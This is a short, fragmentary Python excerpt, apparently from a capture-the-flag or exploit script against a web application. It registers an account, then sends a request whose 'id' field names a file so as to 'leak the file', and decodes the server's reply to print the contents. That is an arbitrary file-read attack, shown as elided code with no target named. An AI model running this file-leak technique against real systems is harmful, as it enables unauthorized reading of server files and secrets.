...
# Register Account
body = {"first-name":"first", "last-name":"last", "username":username, "password":"password123"}
...
# Leak the file
body = {"id":filename, "txt":"PleaseSubscribe"}
...
data = match.group(1)
output = bytes(data, "utf-8").decode("unicode_escape").replace("\\/", "/")
print(output)
